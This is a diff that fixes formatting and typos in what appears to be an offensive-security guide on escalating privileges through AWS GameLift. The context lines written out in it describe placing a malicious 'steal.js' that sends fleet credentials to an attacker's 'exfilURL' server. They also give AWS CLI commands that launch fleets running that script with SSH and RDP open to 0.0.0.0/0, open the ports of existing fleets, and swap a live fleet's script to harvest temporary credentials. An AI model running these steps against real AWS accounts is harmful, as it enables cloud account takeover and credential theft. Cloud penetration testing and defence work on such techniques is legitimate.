@@ -100,7 +100,7 @@ Similar to build exploitation, an attacker needs to create a JavaScript file tha
 
 Example of the `steal.js` file. Remember to set your own `exfilURL`: 
 
-```jsx
+```javascript
 const exfilURL = "http://your.server/"
 
 // Exploit part
@@ -213,7 +213,7 @@ function onMessage(gameMessage) {
     }
 }
 
-function onSendToPlayer(gameMessage) 
+function onSendToPlayer(gameMessage) {
     return (!gameMessage.getPayloadAsText().includes("Reject"));
 }
 
@@ -322,7 +322,7 @@ aws gamelift create-fleet \
     --ec2-instance-type c4.large \
     --fleet-type ON_DEMAND \
 		--ec2-inbound-permissions '[{"FromPort":22,"ToPort": 22,"IpRange": "0.0.0.0/0", "Protocol": "TCP"}, {"FromPort":3389,"ToPort": 3389,"IpRange": "0.0.0.0/0", "Protocol": "TCP"}]' \
-		--runtime-configuration 'ServerProcesses=[{LaunchPath=/LaunchPath=/local/game/init.js,ConcurrentExecutions=1}]' \
+		--runtime-configuration 'ServerProcesses=[{LaunchPath=/local/game/steal.js,ConcurrentExecutions=1}]' \
     --instance-role-arn $AWS_ROLE_ARN
 ```
 
@@ -332,8 +332,8 @@ If there are no scripts in the target’s AWS account that you can use to run a 
 
 You can try to find and use a sample game build provided by Amazon on the target AWS account. Its name is `SampleCustomGameFleet` by default and it has next `runtime-configuration` parameters:
 
-```jsx
---runtime-configuration 'ServerProcesses=[{LaunchPath=/LaunchPath=C:\game\Bin64vc141.Release.Dedicated\MultiplayerSampleLauncher_Server.exe,Parameters=+sv_port 33435 +gamelift_start_server +gm_netsec_enable 0,ConcurrentExecutions=1}]' 
+```javascript
+--runtime-configuration 'ServerProcesses=[{LaunchPath=C:\game\Bin64vc141.Release.Dedicated\MultiplayerSampleLauncher_Server.exe,Parameters=+sv_port 33435 +gamelift_start_server +gm_netsec_enable 0,ConcurrentExecutions=1}]' 
 ```
 
 Then after successful fleet activation, obtain credentials via `get-instance-access`:
@@ -391,7 +391,7 @@ aws ssm start-session --target $INSTANCE_ID
 
 ### gamelift:UpdateFleetPortSettings, gamelift:GetInstanceAccess | gamelift:GetComputeAccess
 
-Providing that you do not have either `iam:PassRole` or `gamelift:CreateFleet` permission, you still can steal temporary credentials from an active fleet that has a Gamelift role attached..
+Providing that you do not have either `iam:PassRole` or `gamelift:CreateFleet` permission, you still can steal temporary credentials from an active fleet that has a Gamelift role attached.
 
 One of the ways to obtain credentials from an active fleet is to connect via SSH.
 
@@ -401,8 +401,8 @@ To do so, you need to run `update-fleet-port-settings` command against fleet:
 
 ```bash
 export FLEET_ID=fleet-d478517d-10df-4923-892f-d765cd6ec54e
-aws gamelift update-fleet-port-settings 
-		--fleet-id $FLEET_ID
+aws gamelift update-fleet-port-settings \
+		--fleet-id $FLEET_ID \
 		--inbound-permission-authorizations='[{"FromPort":22,"ToPort": 22,"IpRange": "0.0.0.0/0", "Protocol": "TCP"}, {"FromPort":3389,"ToPort": 3389,"IpRange": "0.0.0.0/0", "Protocol": "TCP"}]'
 ```
 
@@ -439,7 +439,7 @@ Another way to sneak into script-based fleets is to update a script that is curr
 
 Example of the malicious `steal.js` script. Remember to set your own `exfilURL`: 
 
-```jsx
+```javascript
 const exfilURL = "http://your.server/"
 
 // Exploit part
@@ -552,7 +552,7 @@ function onMessage(gameMessage) {
     }
 }
 
-function onSendToPlayer(gameMessage) 
+function onSendToPlayer(gameMessage) {
     return (!gameMessage.getPayloadAsText().includes("Reject"));
 }
 
@@ -605,15 +605,15 @@ exports.ssExports = {
 };
 ```
 
-You need to obtain a launch path which has been used during`create-fleet`  operation and locate your malicious script in a zipped directory accordingly.
+You need to obtain a launch path which has been used during `create-fleet`  operation and locate your malicious script in a zipped directory accordingly.
 
-Then upload the zipped `steals.js` script using  `update-script` command with the `script-id` which is used for an active fleet. After some time, you will receive temporary credentials from compromised fleets on your server.
+Then upload the zipped `steals.js` script using `update-script` command with the `script-id` which is used for an active fleet. After some time, you will receive temporary credentials from compromised fleets on your server.
 
 ```bash
 zip script.zip steal.js 
 
 export SCRIPT_ID=script-1111aaaa-22bb-33cc-44dd-5555eeee66ff
-aws gamelift update-script
+aws gamelift update-script \
 		--script-id $SCRIPT_ID \
 		--zip-file fileb://script.zip
 ```
